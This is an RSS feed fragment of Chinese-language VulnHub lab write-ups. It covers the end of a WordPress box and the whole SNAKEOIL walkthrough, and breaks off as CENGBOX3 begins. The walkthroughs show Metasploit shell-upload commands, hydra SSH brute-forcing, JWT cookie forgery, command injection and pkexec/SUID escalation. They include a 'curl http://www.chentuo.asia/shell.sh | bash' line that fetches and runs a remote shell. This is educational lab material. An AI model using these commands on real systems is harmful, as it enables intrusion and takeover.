&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password loveme2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts wp.looz.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username gandalf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1111.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很遗憾，gandalf 用户反弹是失败的，继续用 john 用户测试该站点&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password y0uC@n\&amp;#x27;tbr3akIT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts wp.looz.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username john&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password y0uC@n\&amp;#x27;tbr3akIT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意 msf 中使用单引号时需要在其前面加反斜杠转义&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1112.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是仍然没有 shell 反弹出来，目前我们知道的仍然只是两组用户，还没有利用价值&lt;/p&gt;
&lt;h3 id=&#34;dig-判断站点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dig-判断站点&#34;&gt;#&lt;/a&gt; dig 判断站点&lt;/h3&gt;
&lt;p&gt;判断一下网站是否存在其他的站点  &lt;code&gt;dig wp.looz.com @192.168.31.80&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1113.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很遗憾也没有其他站点，接下来可以看看后台怎么用，有没有可以操作的地方，找到一个可以上传文件的地方，我们直接上传 php 木马看有没有效果&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1114.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很遗憾，这个地方也上传失败了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1115.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;密码破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密码破解&#34;&gt;#&lt;/a&gt; 密码破解&lt;/h3&gt;
&lt;p&gt;接下来就需要爆破了，爆破用户名和密码，用户名可以选用前期通过 wpscan 得到的几个用户名，密码选用一个比较全的字典。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hydra -l gandalf -P /usr/share/wordlists/rockyou.txt 192.168.31.80 ssh -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要是自己破解不知道要破解到猴年马月，而且在实际测试中受制于防守方部署的 IDS、IPS 我们没法使用 hydra 暴力测试，这里我看了相关作者的文档，利用 gandalf 进行了破解密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1116.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到 gandalf 的密码 highschoolmusical&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh 192.168.31.80 -l gandalf&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1117.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;suid-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-提权&#34;&gt;#&lt;/a&gt; suid 提权&lt;/h3&gt;
&lt;p&gt;拿到服务器后，搜索到了一个 s 权限的文件  &lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1118.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 strings 检查了一下并没有发现封装什么特殊的命令，可能是作者自己封装的一个命令，没有头绪怎么处理这个文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1119.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然是可执行文件，就去执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1120.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到了 root 的 shell&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/125%20SNAKEOIL/</guid>
            <title>VULNHUB 25 SNAKEOIL</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/125%20SNAKEOIL/</link>
            <category>VULNHUB 21-30</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGlnaXRhbHdvcmxkbG9jYWwtc25ha2VvaWwsNzM4Lw==&#34;&gt;https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2ODg5NjQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15688964.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 SNAKEOIL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-580.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.143&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.143&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-581.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,8080&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAy&#34;&gt;http://192.168.31.102&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-582.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.143&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-583.png&#34; width=&#34;250&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 80 端口没有任何发现&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAv&#34;&gt;http://192.168.31.143:8080/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-584.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.143:8080/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-585.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 8080 端口存在以下目录&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=&#34;&gt;http://192.168.31.143:8080/login&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvc2VjcmV0&#34;&gt;http://192.168.31.143:8080/secret&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdGVzdA==&#34;&gt;http://192.168.31.143:8080/test&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=&#34;&gt;http://192.168.31.143:8080/users&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;burp-篡改数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-篡改数据包&#34;&gt;#&lt;/a&gt; BURP 篡改数据包&lt;/h3&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=&#34;&gt;http://192.168.31.143:8080/login&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-586.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示请求方法错了，抓包看下数据包：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-587.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示提交方法有问题，换其他的提交方法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-588.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示 username 字段不能为空，那就加上 username 字段&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-589.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提示内容不理解，换其他目录查看&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-590.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示请求方法错了，抓包看下数据包：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-591.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示提交方法有问题，换其他的提交方法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-592.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示 username 字段不能为空，那就加上 username 字段&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-593.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 没啥效果，去访问其他页面看看 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=&#34;&gt;http://192.168.31.143:8080/users&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-594.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 猜测确实需要 username 和 password 两个字段&lt;/p&gt;
&lt;h3 id=&#34;content-type-字段利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#content-type-字段利用&#34;&gt;#&lt;/a&gt; Content-Type 字段利用&lt;/h3&gt;
&lt;p&gt;仔细观察数据包，发现缺少 Content-type 字段：&lt;br&gt;
application/x-www-form-urlencoded： 窗体数据被编码为名称 / 值对。这是标准的编码格式。&lt;br&gt;
multipart/form-data： 窗体数据被编码为一条消息，页上的每个控件对应消息中的一个部分。&lt;br&gt;
text/plain： 窗体数据以纯文本形式进行编码，其中不含任何控件或格式字符。&lt;/p&gt;
&lt;p&gt;访问目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;br&gt;
 添加字段：Content-Type:application/x-www-form-urlencoded&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-595.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示变了，password 字段不能为空，再加上 password 字段：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-596.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注册成功，那就在 /login 页面登陆一下，要加上用户名和密码：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-597.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再访问一些别的页面（现在是在登陆状态中）：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-598.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 没啥新发现&lt;/p&gt;
&lt;h3 id=&#34;扩大信息面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扩大信息面&#34;&gt;#&lt;/a&gt; 扩大信息面&lt;/h3&gt;
&lt;p&gt;用更大的字典又扫了一遍目录，发现两个新目录&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvY3JlYXRl&#34;&gt;http://192.168.31.143:8080/create&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu&#34;&gt;http://192.168.31.143:8080/run&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-599.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu&#34;&gt;http://192.168.31.143:8080/run&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-600.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示需要修改请求方法，抓取数据包&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-601.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;修改提交方法为 POST&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-602.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示要以 url:port 形式提供要请求的 URL：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-603.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;格式换成 Content-Type: application/json， 在 ajax 中，如果没加 contentType:“application/json”，那么 data 就对应的是 json 对象；反之，如果加了 contentType:“application/json”，那么 ajax 发送的就是字符串。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-604.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 现在又提示需要 secret key ，&lt;/p&gt;
&lt;h3 id=&#34;伪造-access_token&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#伪造-access_token&#34;&gt;#&lt;/a&gt; 伪造 access_token&lt;/h3&gt;
&lt;p&gt;访问一下 /secret 页面：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-605.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;登录是失败的，应该是缺少 cookie 的，之前注册成功后，登陆时返回一个 token 值：&lt;br&gt;
 &lt;code&gt;“access_token”:“ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1MjY4NTY1MCwianRpIjoiODhkNDllNzktNjRlNC00ZWZlLWIyZTItODhlOWJhN2NmNWQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE2NTI2ODU2NTAsImV4cCI6MTY1MjY4NjU1MH0.kwHX8k6JDWCCjoAHtReOPOe3H7CSshM5oXZYl2XpSDo”&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但是填写 cookie 时是需要一个 key 值的，这个 key 值在尝试 access_token 时是不对的&lt;br&gt;
翻阅网站，找到以下地址中网站中有个链接&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-606.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点进去看看，有一些配置信息链接，从中找到了 cookie 的名称&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-607.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次提交 cookie，字段名字为 access_token_cookie：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-608.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到 “secret_key”: “commandexecutionissecret”&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重新梳理一下思路：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;1 .访问registration,login页面，因为Get方式报错，所以改为了Post方式提示&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;字段缺失，因此增加了该字段，但是无效果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;2 .访问&lt;span class=&#34;built_in&#34;&gt;users&lt;/span&gt;页面，发现确实需要&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;和password两个字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;3 .重新审查registration数据包，发现缺少Content-Type字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;4 .在registration添加字段：Content-Type:application/x-www-form-urlencoded 后成功提交了&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;数据提示缺少password字段，添加后返回注册成功的消息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;5 .在login中添加Content-Type与&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;和password后登陆成功，返回了access_token&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;6 .访问run页面，发现需要提交url：port数据，修改Content-Type为json数据后，把url和port提交，提示需要secret_key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;7.访问secret页面，发现返回错误，推测与login登陆后返回的token有关，但cookies的字段名是不知道的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;8 .点击网站，搜寻到cookies的字段名为access_token_cookie，将cookies的字段名修改后重新提交到secret页面，返回了secret_key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;9 .接下来需要访问run界面，并且把上述得到的secret_key加上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;curl-rce-命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl-rce-命令执行&#34;&gt;#&lt;/a&gt; CURL RCE 命令执行&lt;/h3&gt;
&lt;p&gt;访问 run 界面，加上 secret_key 字段&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-609.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;返回了比较奇怪的字符串，直接搜索，发现这是 curl 命令执行后的回显&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-610.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;相当于在 curl 后拼接命令，但是管道符号不起作用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-611.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;后面在加一个分号时成功得到了 whoami 信息，是 RCE 漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-612.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试往其中写入 shell: &lt;code&gt;curl http://www.chentuo.asia/shell.sh | bash;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-613.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试:`curl &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g=&#34;&gt;http://www.chentuo.asia/shell.sh&lt;/span&gt; | sh;``&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-614.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 登陆成功，拿到了 patrick 的权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-615.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;pkexec-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pkexec-提权&#34;&gt;#&lt;/a&gt; pkexec 提权&lt;/h3&gt;
&lt;p&gt;服务器存在 s 权限的 pkexec，并且有 gcc 编译器&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-616.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 通过 pkexec 进行提权，成功拿到了 root 权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-617.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;配置文件泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置文件泄露&#34;&gt;#&lt;/a&gt; 配置文件泄露&lt;/h3&gt;
&lt;p&gt;看看有没有其他的提权方式，shutdown 可以无密码使用但没法提权&lt;br&gt;
调用 root 权限的时候是需要 patrick 的密码的，但是我们没密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-618.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找找系统中的文件，看有没有线索，最后在～/flask_blog/app.py 文件中找到一个密码：NOreasonableDOUBTthisPASSWORDisGOOD&lt;br&gt;
sudo su 使用此密码通过 patrick 来提到 root&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-619.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权成功，拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/141%20CENGBOX3/</guid>
            <title>VULNHUB 41 CENGBOX3</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/141%20CENGBOX3/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VuZ2JveC0zLDU3Ni8=&#34;&gt;https://www.vulnhub.com/entry/cengbox-3,576/&lt;/span&gt;&lt;br&gt;
